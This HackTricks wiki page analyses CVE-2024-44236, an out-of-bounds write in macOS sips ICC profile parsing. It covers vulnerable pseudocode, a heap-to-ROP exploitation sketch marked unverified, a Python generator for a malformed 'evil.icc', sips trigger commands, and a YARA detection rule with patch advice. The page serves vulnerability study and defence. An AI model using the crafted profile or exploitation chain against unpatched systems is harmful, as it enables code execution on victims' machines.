---
title: "Aw2exec Sips Icc Profile"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/binary-exploitation/arbitrary-write-2-exec/aw2exec-sips-icc-profile.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: reversing
---

# AW2Exec - `sips` ICC Profile Out-of-Bounds Write (CVE-2024-44236)

`sips` ICC Profile Out-of-Bounds Write (CVE-2024-44236)

## Overview

An out-of-bounds write in Apple macOS **Scriptable Image Processing System** (`sips`) was analyzed in `sips-307` from macOS 15.0.1. The bug affects validation of the `offsetToCLUT` field in `lutAToBType` (`mAB` ) and `lutBToAType` (`mBA` ) ICC tag data. If `offsetToCLUT` equals the tag-data size, the vulnerable loop can read and conditionally replace nonzero bytes with zero for up to **16 bytes past the heap allocation**. ZDI rates CVE-2024-44236 at 7.8 and describes code execution in the current process as the worst-case impact.[\[1\]](#references)[\[2\]](#references)

Apple fixed CVE-2024-44236 in **macOS Sequoia 15.1**, released October 28, 2024.<sup>[\[3\]](#references)</sup> CVE-2025-24185 is a separate `sips` out-of-bounds write fixed in Sequoia 15.3, Sonoma 14.7.3, and Ventura 13.7.3; Apple’s stated impact for that issue is unexpected app termination.[\[4\]](#references)

## Vulnerable Code

```
// Pseudocode extracted from sub_1000194D0 in sips-307 (macOS 15.0.1)
if (offsetToCLUT <= tagDataSize) {
    // Simplified: inspect 16 bytes starting *at* offsetToCLUT.
    for (uint32_t i = offsetToCLUT; i < offsetToCLUT + 16; i++) {
        if (should_clear(buffer[i]))
            buffer[i] = 0;        // missing i < tagDataSize check
    }
}
```
## Exploitation Steps

1.
**Craft a malicious `.icc` profile**
  - Set up a minimal ICC header (`acsp` ) and add one`mAB` (or`mBA` ) tag.
  - Configure the tag table so the **`offsetToCLUT` equals the tag size** (`tagDataSize` ).
  - Use a controlled test case with nonzero bytes in the adjacent heap allocation so the conditional writes can be observed. File adjacency does not imply heap adjacency; heap shaping is a separate, build-specific part of exploitation.
2. Set up a minimal ICC header (
3.
**Trigger parsing with any sips operation that touches the profile**```
# verification path (no output file needed)
sips --verifyColor evil.icc
# or implicitly when converting images that embed the profile
sips -s format png payload.jpg --out out.png
```
4.
**Heap metadata corruption ➜ arbitrary write ➜ ROP**
 Turning a short, conditional out-of-bounds zero-write into code execution requires control of heap layout plus a suitable object or allocator target. One exploitation sketch proposes placing the tag allocation at the end of a`nano_zone` 0x1000-byte slab, corrupting adjacent slot metadata such as`meta->slot_B` , then using a subsequent free/allocation cycle to overlap a fake object and replace a C++ vtable pointer before a ROP pivot. This preserves the useful research direction, but the public ZDI material establishes only the out-of-bounds primitive and potential code-execution impact; it does not substantiate that exact allocator chain. Treat the sketch, offsets, allocator internals, and ROP details as unverified and build-specific until reproduced against the exact macOS image.<sup>[\[1\]](#references)</sup>

### [Quick PoC generator (Python 3)](#quick-poc-generator-python-3)

```
#!/usr/bin/env python3
import struct
TAG_OFFSET = 144                          # 128-byte header + count + one record
TAG_SIZE = 52
header = bytearray(128)
header[8:12] = b'\x04\x30\x00\x00'      # ICC v4.3
header[12:16] = b'mntr'                   # display-device profile
header[16:20] = b'RGB '
header[20:24] = b'XYZ '
struct.pack_into('>6H', header, 24, 2024, 1, 1, 0, 0, 0)
header[36:40] = b'acsp'                   # ICC profile signature is at offset 36
header[40:44] = b'APPL'
struct.pack_into('>III', header, 68, 0x0000F6D6, 0x00010000, 0x0000D32D)  # D50
struct.pack_into('>I', header, 0, TAG_OFFSET + TAG_SIZE)
# A2B0 is the tag signature; its payload type is mAB.
table = struct.pack('>I4sII', 1, b'A2B0', TAG_OFFSET, TAG_SIZE)
mab = bytearray(TAG_SIZE)
mab[0:4] = b'mAB '
mab[8] = 3                                # input channels
mab[9] = 3                                # output channels
struct.pack_into('>I', mab, 24, TAG_SIZE) # offsetToCLUT == tag-data size
profile = header + table + mab
open('evil.icc', 'wb').write(profile)
print('[+] Wrote evil.icc (%d bytes)' % len(profile))
```
### [YARA detection rule](#yara-detection-rule)

```
rule ICC_mAB_offsetToCLUT_anomaly
{
    meta:
        description = "Detect CLUT offset equal to tag length in mAB/mBA (CVE-2024-44236)"
        author       = "HackTricks"
    strings:
        $magic = { 61 63 73 70 }          // 'acsp'
        $mab   = { 6D 41 42 20 }          // 'mAB '
        $mba   = { 6D 42 41 20 }          // 'mBA '
    condition:
        filesize >= 144 and $magic at 36 and uint32be(128) == 1 and
        (
          $mab at uint32be(136) or $mba at uint32be(136)
        ) and
        uint32be(uint32be(136) + 24) == uint32be(140)
}
```
The header and tag layout follow the ICC profile format, but this remains a structural test generator rather than a reliable exploit: parser reachability and heap adjacency depend on the exact target build.<sup>[\[5\]](#references)</sup> The compact rule handles this one-tag layout only. A production parser must iterate every tag-table record with bounds and integer-overflow checks; do not rely on this rule as complete coverage.

## [Impact](#impact)

Processing a crafted ICC profile through the vulnerable `sips` path may terminate the process and could lead to code execution in the context of that process. ICC profiles can be standalone files or embedded in formats such as PNG, JPEG, and TIFF, but reachability through Preview, Quick Look, Safari, or Mail must be tested separately. The cited advisories do not establish a Gatekeeper bypass.[\[1\]](#references)[\[2\]](#references)

## [Detection & Mitigation](#detection--mitigation)

- **Patch:** for Sequoia, install macOS 15.1 or later; use Apple’s security-release guidance for other supported branches.<sup>[\[3\]](#references)</sup>
- Use the limited YARA rule above for the exact proof-of-concept layout, and deploy a real ICC parser when broader inspection is required.
- Strip or sanitise embedded ICC profiles with `exiftool -icc_profile= -overwrite_original <file>` before further processing on untrusted files.
- Analyze unknown media in an isolated, disposable virtual machine when practical.
- For DFIR, execution of `sips --verifyColor` , relevant process crashes, and unexpected`ColorSync` library loads may provide useful context, but absence of these events does not rule out another application reaching the affected parser.

## [References](#references)

Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**

Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**

Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**

Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).

## Support HackTricks

- Check the
[**subscription plans**](https://github.com/sponsors/carlospolop)!
**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
